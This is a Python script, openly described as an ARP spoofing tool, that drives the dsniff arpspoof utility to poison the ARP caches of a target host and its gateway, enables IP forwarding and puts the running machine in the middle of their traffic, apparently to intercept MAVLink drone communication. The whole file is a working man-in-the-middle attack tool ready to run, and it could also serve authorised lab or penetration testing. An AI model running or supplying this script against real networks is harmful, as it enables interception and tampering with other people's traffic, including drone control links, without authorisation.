#!/usr/bin/env python3
"""
ARP Spoofing Script
Performs ARP spoofing to enable MITM attacks on MAVLink communication
"""

import sys
import subprocess
import time
import signal
import os

def enable_ip_forwarding():
    """Enable IP forwarding on Linux"""
    try:
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], 
                      check=True, capture_output=True)
        print("[+] IP forwarding enabled")
        return True
    except Exception as e:
        print(f"[-] Failed to enable IP forwarding: {e}")
        return False

def disable_ip_forwarding():
    """Disable IP forwarding"""
    try:
        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], 
                      check=True, capture_output=True)
        print("[+] IP forwarding disabled")
    except:
        pass

def get_mac_address(ip):
    """Get MAC address for IP using ARP table"""
    try:
        result = subprocess.run(['arp', '-n', ip], 
                              capture_output=True, text=True, check=True)
        import re
        match = re.search(r'([0-9a-f]{2}[:-]){5}[0-9a-f]{2}', result.stdout, re.IGNORECASE)
        if match:
            return match.group(0)
    except:
        pass
    return None

def arp_spoof(target_ip, gateway_ip, interface):
    """
    Perform ARP spoofing using arpspoof
    
    Args:
        target_ip: Target IP to spoof
        gateway_ip: Gateway IP
        interface: Network interface
    """
    print(f"[*] Starting ARP spoofing...")
    print(f"[*] Target: {target_ip}")
    print(f"[*] Gateway: {gateway_ip}")
    print(f"[*] Interface: {interface}")
    
    # Get MAC addresses
    target_mac = get_mac_address(target_ip)
    gateway_mac = get_mac_address(gateway_ip)
    
    if not target_mac:
        print(f"[!] Could not resolve MAC for {target_ip}")
    if not gateway_mac:
        print(f"[!] Could not resolve MAC for {gateway_ip}")
    
    # Enable IP forwarding
    enable_ip_forwarding()
    
    # Start arpspoof processes
    processes = []
    
    try:
        # Spoof target (tell target we are gateway)
        print(f"[*] Spoofing {target_ip} (telling it we are {gateway_ip})...")
        proc1 = subprocess.Popen(
            ['arpspoof', '-i', interface, '-t', target_ip, gateway_ip],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        processes.append(proc1)
        
        # Spoof gateway (tell gateway we are target)
        print(f"[*] Spoofing {gateway_ip} (telling it we are {target_ip})...")
        proc2 = subprocess.Popen(
            ['arpspoof', '-i', interface, '-t', gateway_ip, target_ip],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        processes.append(proc2)
        
        print("[+] ARP spoofing active (Press Ctrl+C to stop)...")
        print("[!] All traffic between target and gateway now flows through this machine")
        
        # Wait
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Stopping ARP spoofing...")
    
    finally:
        # Stop processes
        for proc in processes:
            proc.terminate()
            proc.wait()
        
        # Disable IP forwarding
        disable_ip_forwarding()
        
        print("[+] ARP spoofing stopped")

def main():
    if len(sys.argv) < 4:
        print("Usage: python3 arp_spoofing.py <target_ip> <gateway_ip> <interface>")
        print("Example: python3 arp_spoofing.py 192.168.13.14 192.168.13.1 wlan0")
        print("\nThis script performs ARP spoofing to enable MITM attacks.")
        print("Requires: arpspoof (from dsniff package)")
        print("Install: sudo apt-get install dsniff")
        print("\nWARNING: This attack intercepts all network traffic!")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    interface = sys.argv[3]
    
    # Check if arpspoof is available
    try:
        subprocess.run(['which', 'arpspoof'], check=True, capture_output=True)
    except subprocess.CalledProcessError:
        print("[-] arpspoof not found. Install with: sudo apt-get install dsniff")
        sys.exit(1)
    
    # Check if running as root
    if os.geteuid() != 0:
        print("[-] This script must be run as root (use sudo)")
        sys.exit(1)
    
    # Perform ARP spoofing
    arp_spoof(target_ip, gateway_ip, interface)

if __name__ == "__main__":
    main()
